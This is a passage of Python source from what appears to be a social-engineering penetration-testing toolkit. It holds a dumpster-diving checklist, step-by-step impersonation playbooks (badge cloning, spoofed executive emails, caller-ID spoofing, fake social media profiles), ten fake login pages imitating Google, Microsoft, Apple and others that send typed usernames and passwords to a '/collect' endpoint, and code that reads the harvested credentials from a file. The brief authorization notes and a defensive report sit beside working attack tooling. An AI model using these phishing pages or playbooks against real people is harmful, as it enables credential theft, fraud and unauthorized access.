                "Dress as a waste management worker or recycler to avoid suspicion.",
                "Bring gloves, headlamp, trash bags, hand sanitizer.",
                "Check local laws - some jurisdictions prohibit dumpster diving.",
            ],
            "what_to_look_for": [
                {"item": "Documents with PII", "risk": "high", "examples": "HR files, payroll, medical records"},
                {"item": "Printouts with credentials", "risk": "high", "examples": "Config sheets, sticky notes, default passwords"},
                {"item": "Business cards", "risk": "medium", "examples": "Names, titles, phone numbers for vishing"},
                {"item": "USB drives / hard drives", "risk": "critical", "examples": "May contain full databases or source code"},
                {"item": "Internal memos / org charts", "risk": "medium", "examples": "Reveals hierarchy, departments, projects"},
                {"item": "Shredded documents", "risk": "medium", "examples": "Can sometimes be reconstructed"},
                {"item": "Old equipment", "risk": "high", "examples": "Laptops, phones, monitors (may have data residue)"},
                {"item": "Email printouts", "risk": "high", "examples": "Conversations, attachments, credentials"},
            ],
            "post_dive": [
                "Catalog all findings with photos.",
                "Store sensitive materials securely.",
                "Sanitize and document chain of custody.",
                "Include findings in the final report.",
                "Shred or securely destroy any sensitive material after the engagement.",
            ],
            "created_at": datetime.now().isoformat(),
        }

        self.results["dumpster_diving"] = checklist
        self.log("Dumpster diving checklist generated", "success")
        return checklist

    # ─────────────────────────────────────────────────────────────
    #  IMPERSONATION TEST
    # ─────────────────────────────────────────────────────────────
    def impersonation_test(self, target, method="badge"):
        """Test impersonation scenarios against a target."""
        methods = {
            "badge": {
                "title": "Badge / ID Impersonation",
                "description": "Use a cloned or fake badge to gain physical access.",
                "steps": [
                    "Obtain badge design from social media / LinkedIn photos.",
                    "Create a convincing replica (see badge_clone method).",
                    "Approach the target facility during shift change.",
                    "Present badge confidently and walk through access points.",
                    "Note how many checkpoints you pass before being challenged.",
                ],
                "risk_level": "medium",
                "detection_difficulty": "easy to detect if guards verify IDs",
            },
            "email": {
                "title": "Email Impersonation (Whaling / Spoofing)",
                "description": "Spoof emails from a trusted internal sender.",
                "steps": [
                    "Identify a senior executive or known sender.",
                    "Set up a spoofed email domain (e.g., target-corp.com vs target-corp.com).",
                    "Send emails requesting action (wire transfer, credential entry, file access).",
                    "Track opens and clicks with email tracking tools.",
                    "Escalate to targeted payload delivery if initial emails succeed.",
                ],
                "risk_level": "high",
                "detection_difficulty": "requires email security awareness",
            },
            "phone": {
                "title": "Phone Impersonation (Vishing)",
                "description": "Call employees posing as IT support, vendor, or executive.",
                "steps": [
                    "Use a spoofed caller ID matching the organization.",
                    "Follow a vishing script (see vishing_script method).",
                    "Escalate from low-value to high-value information.",
                    "Record the call (with legal authorization).",
                    "Document how far you get before detection.",
                ],
                "risk_level": "medium",
                "detection_difficulty": "requires call-back verification training",
            },
            "physical": {
                "title": "Physical Personation",
                "description": "Physically impersonate a known person on-site.",
                "steps": [
                    "Study photos and mannerisms of a known employee (LinkedIn, social media).",
                    "Use the badge_clone method to create matching credentials.",
                    "Approach reception or security with a plausible story.",
                    "Test how closely the staff verify identity.",
                    "Document every interaction and checkpoint.",
                ],
                "risk_level": "high",
                "detection_difficulty": "hard to detect without strict ID policies",
            },
            "social_media": {
                "title": "Social Media Impersonation",
                "description": "Create fake profiles to build trust with targets.",
                "steps": [
                    "Create a believable profile (use stock photos, fill in realistic details).",
                    "Connect with targets on LinkedIn, Twitter, etc.",
                    "Build rapport over days/weeks before making a request.",
                    "Leverage the trust to extract information or deliver payloads.",
                    "Document response rates and trust escalation.",
                ],
                "risk_level": "medium",
                "detection_difficulty": "requires social media awareness training",
            },
        }

        self.log(f"Running impersonation test ({method}) against {target}", "warning")

        if method not in methods:
            method = "badge"

        m = methods[method]
        result = {
            "target": target,
            "method": method,
            "title": m["title"],
            "description": m["description"],
            "steps": m["steps"],
            "risk_level": m["risk_level"],
            "detection_difficulty": m["detection_difficulty"],
            "legal_note": "This test requires written authorization. Do not attempt without ROE.",
            "created_at": datetime.now().isoformat(),
        }

        self.results.setdefault("impersonation_tests", []).append(result)
        self.log(f"Impersonation test plan created: {m['title']}", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  LEGACY / COMPAT METHODS
    # ─────────────────────────────────────────────────────────────
    def create_phishing_page(self, template, output_dir=None):
        """Legacy method - delegates to phishing_page_create."""
        return self.phishing_page_create(template, output_dir)

    def start_phishing_server(self, port=8080, directory=None):
        """Legacy method - delegates to phishing_server_start."""
        return self.phishing_server_start(port)

    def credential_harvester(self, port=8080):
        """Legacy method - delegates to phishing_server_start."""
        return self.phishing_server_start(port)

    def collect_credentials(self):
        """Collect captured credentials from the harvester file."""
        try:
            creds_file = os.path.join(tempfile.gettempdir(), "harvested_creds.json")
            entries = []
            if os.path.exists(creds_file):
                with open(creds_file, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                entries.append(json.loads(line))
                            except json.JSONDecodeError:
                                entries.append({"raw": line})

            self.log(f"Collected {len(entries)} credential entries", "success")
            return entries
        except FileNotFoundError:
            self.log("No harvested credentials found", "info")
            return []

    # ─────────────────────────────────────────────────────────────
    #  BUILT-IN HTML TEMPLATES
    # ─────────────────────────────────────────────────────────────
    def _facebook_template(self):
        return self._generic_login_template("Facebook")

    def _google_template(self):
        return self._generic_login_template("Google")

    def _linkedin_template(self):
        return self._generic_login_template("LinkedIn")

    def _office365_template(self):
        return self._generic_login_template("Microsoft Office 365")

    def _microsoft_template(self):
        return self._generic_login_template("Microsoft")

    def _apple_template(self):
        return self._generic_login_template("Apple")

    def _github_template(self):
        return self._generic_login_template("GitHub")

    def _twitter_template(self):
        return self._generic_login_template("Twitter")

    def _instagram_template(self):
        return self._generic_login_template("Instagram")

    def _dropbox_template(self):
        return self._generic_login_template("Dropbox")

    def _generic_login_template(self, service_name):
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>{service_name} Sign In</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }}
        .login-box {{ width: 360px; background: white; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 40px 36px; }}
        .logo {{ text-align: center; font-size: 22px; font-weight: 600; color: #333; margin-bottom: 28px; }}
        input {{ width: 100%; padding: 12px 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }}
        input:focus {{ outline: none; border-color: #1a73e8; }}
        button {{ width: 100%; padding: 12px; margin-top: 8px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-size: 15px; cursor: pointer; font-weight: 500; }}
        button:hover {{ background: #1557b0; }}
        .links {{ text-align: center; margin-top: 16px; font-size: 13px; }}
        .links a {{ color: #1a73e8; text-decoration: none; }}
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">{service_name}</div>
        <form action="/collect" method="POST">
            <input type="text" name="username" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="links">
            <a href="#">Forgot password?</a> &middot; <a href="#">Create account</a>
        </div>
    </div>
</body>
</html>"""

    # ─────────────────────────────────────────────────────────────
    #  UTILITIES
    # ─────────────────────────────────────────────────────────────
    def run_command(self, cmd, timeout=30):
        """Execute a shell command and return stdout."""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout
            )
            return result.stdout
        except Exception:
            return None

    def stop_all(self):
        """Stop all running services."""
        self.is_running = False
        self.log("Stopping all social engineering services", "warning")

        stop_commands = [
            "pkill -f 'python3.*http.server'",
            "pkill -f se_harvester.py",
        ]

        for cmd in stop_commands:
            try:
                self.run_command(cmd)
            except Exception:
                pass

        self.active_servers.clear()
        self.log("All services stopped", "success")

    # ─────────────────────────────────────────────────────────────
    #  REPORT
    # ─────────────────────────────────────────────────────────────
    def generate_report(self):
        """Generate a comprehensive social engineering engagement report."""
        report = {
            "title": "Social Engineering Engagement Report",
            "generated_at": datetime.now().isoformat(),
            "summary": {
                "phishing_emails_created": len(self.results.get("phishing_emails", [])),
                "smishing_messages": len(self.results.get("smishing", [])),
                "vishing_scripts": len(self.results.get("vishing_scripts", [])),
                "pretexts_generated": len(self.results.get("pretexts", [])),
                "impersonation_tests": len(self.results.get("impersonation_tests", [])),
                "pages_created": 1 if "phishing_page" in self.results else 0,
                "badges_created": 1 if "badge_clone" in self.results else 0,
                "payloads_generated": (
                    (1 if "rubber_ducky" in self.results else 0)
                    + (1 if "badusb" in self.results else 0)
                ),
            },
            "results": self.results,
            "recommendations": [
                "Implement regular security awareness training for all employees.",
                "Deploy email authentication (SPF, DKIM, DMARC) to reduce spoofing.",
                "Enforce MFA across all critical systems.",
                "Establish a clear procedure for reporting suspicious contacts.",
                "Conduct periodic physical security assessments.",
                "Implement DNS filtering to block known phishing domains.",
                "Train reception and security staff on badge verification.",
                "Conduct regular vishing and phishing simulations.",
            ],
            "risk_ratings": {
                "critical": "Immediate action required - successful social engineering leading to data breach or financial loss.",
                "high": "Action required within 30 days - significant vulnerabilities in human layer security.",
                "medium": "Action required within 90 days - moderate weaknesses that could be exploited.",
                "low": "Address during next review cycle - minor improvements to security posture.",
            },
        }

        self.log("Social engineering report generated", "success")
        return report
